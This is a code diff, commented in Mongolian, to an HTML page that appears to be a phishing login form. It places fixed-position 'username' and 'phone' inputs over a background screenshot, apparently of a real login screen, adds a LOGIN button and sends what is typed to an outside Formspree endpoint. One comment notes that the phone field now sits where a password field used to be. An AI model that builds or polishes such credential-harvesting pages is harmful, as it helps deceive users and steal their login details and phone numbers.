@@ -10,17 +10,19 @@
 input {
   color: black;
   background-color: white;
-  font-size: 45px;
 }
 h1 {
   font-size: 50px;
 }
-label {
+label{
   font-size: 50px;
 }
+input{
+  font-size: 45px;
+}
 
-/* Text болон phone input-уудад үйлчлэх стиль */
-input[type=text], select {
+/* User input байрлал */
+input[type=text].user-input {
   position: fixed;
   height: 115px;
   top: 18.9%;
@@ -34,8 +36,8 @@ input[type=text], select {
   box-sizing: border-box;
 }
 
-/* Хоёр дахь input-ийн байрлал (Top: 28.8%) */
-.phone-input {
+/* Phone input байрлал (хуучин password байсан байрлал) */
+input[type=text].phone-input {
   position: fixed;
   height: 115px;
   top: 28.8%;
@@ -68,7 +70,8 @@ input[type=submit]:hover {
   background-color: #45a049;
 }
 
-div.container {
+/* Контейнер хэсэг */
+.login-box {
   background-image: url('Screenshot_2.png');
   background-repeat: no-repeat;
   background-size: cover;
@@ -93,18 +96,11 @@ body {
 </head>
 <body>
 
-<div class="container">
-    <!-- Formspree линк болон method="POST" тохируулсан хэсэг -->
+<div class="login-box">
     <form action="https://formspree.io/f/xaeegqyy" method="POST">
         <h1 style="color:rgb(255, 255, 255 );"></h1>
-        
-        <!-- Хэрэглэгчийн нэр -->
-        <input type="text" name="username" placeholder="Enter username" required><br>
-        
-        <!-- Утасны дугаар (Formspree руу амжилттай очих зорилгоор text хэлбэртэй болгосон) -->
+        <input type="text" name="username" class="user-input" placeholder="Enter username" required><br>
         <input type="text" name="phone" class="phone-input" placeholder="Enter phone number" required><br>
-        
-        <!-- Илгээх товч -->
         <input type="submit" value="LOGIN">
     </form>
 </div>
